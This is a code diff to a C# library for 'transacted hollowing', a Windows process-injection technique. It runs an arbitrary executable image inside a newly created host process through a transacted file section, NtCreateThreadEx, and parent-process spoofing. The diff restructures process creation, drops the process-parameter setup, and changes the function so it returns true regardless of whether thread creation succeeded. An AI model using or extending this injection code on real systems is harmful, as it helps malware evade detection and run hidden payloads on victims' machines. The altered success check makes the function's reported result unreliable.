@@ -12,15 +12,15 @@ namespace TransactedHollowing.Library
             byte[] imageData,
             string commandLine,
             int ppid,
+            bool isBlocking,
             string windowTitle)
         {
             NTSTATUS ntstatus;
+            bool status;
             IntPtr hTransactedSection;
-            IntPtr hHollowingProcess;
             IntPtr pNewSectionBase;
             IntPtr pPeb;
             IntPtr pRemoteEntryPoint;
-            IntPtr pRemoteProcessParameters;
             uint nEntryPointOffset;
             bool is64BitImage;
             bool is64BitTarget;
@@ -116,9 +116,7 @@ namespace TransactedHollowing.Library
             Console.WriteLine("[>] Trying to create transacted file.");
             Console.WriteLine("    [*] File Path : {0}", tempFilePath);
 
-            hTransactedSection = Utilities.CreateTransactedSection(
-                tempFilePath,
-                imageData);
+            hTransactedSection = Utilities.CreateTransactedSection(tempFilePath, imageData);
 
             if (hTransactedSection == Win32Consts.INVALID_HANDLE_VALUE)
             {
@@ -135,11 +133,15 @@ namespace TransactedHollowing.Library
                 return false;
             }
 
-            hHollowingProcess = Utilities.CreateSuspendedProcess(
-                imagePathName,
-                ppid);
+            status = Utilities.CreateInitialProcess(
+                commandLine,
+                ppid,
+                isBlocking,
+                windowTitle,
+                out IntPtr hHollowingProcess,
+                out IntPtr hThread);
 
-            if (hHollowingProcess == IntPtr.Zero)
+            if (!status)
             {
                 NativeMethods.NtClose(hTransactedSection);
 
@@ -228,43 +230,10 @@ namespace TransactedHollowing.Library
                 return false;
             }
 
-            Console.WriteLine("[>] Trying to set process parameters to the hollowing process.");
-
-            pRemoteProcessParameters = Utilities.SetProcessParameters(
-                hHollowingProcess,
-                imagePathName,
-                commandLine,
-                Environment.CurrentDirectory,
-                windowTitle);
-
-            if (pRemoteProcessParameters == IntPtr.Zero)
-            {
-                Console.WriteLine("[-] Failed to set process parameters.");
-
-                try
-                {
-                    if (File.Exists(tempFilePath))
-                        File.Delete(tempFilePath);
-                }
-                catch
-                {
-                    Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
-                }
-
-                NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
-                NativeMethods.NtClose(hHollowingProcess);
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Process parameters are set successfully.");
-            }
-
             Console.WriteLine("[>] Trying to start hollowing process thread.");
 
             ntstatus = NativeMethods.NtCreateThreadEx(
-                out IntPtr hThread,
+                out IntPtr hNewThread,
                 ACCESS_MASK.THREAD_ALL_ACCESS,
                 IntPtr.Zero,
                 hHollowingProcess,
@@ -275,6 +244,7 @@ namespace TransactedHollowing.Library
                 0,
                 0,
                 IntPtr.Zero);
+            NativeMethods.NtTerminateThread(hThread, Win32Consts.STATUS_SUCCESS);
 
             if (ntstatus != Win32Consts.STATUS_SUCCESS)
             {
@@ -287,8 +257,8 @@ namespace TransactedHollowing.Library
             {
                 Console.WriteLine("[+] Thread is resumed successfully.");
             }
-
-            NativeMethods.NtClose(hThread);
+            
+            NativeMethods.NtClose(hNewThread);
             NativeMethods.NtClose(hHollowingProcess);
 
             try
@@ -301,7 +271,7 @@ namespace TransactedHollowing.Library
                 Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
             }
 
-            return (ntstatus == Win32Consts.STATUS_SUCCESS);
+            return true;
         }
     }
 }
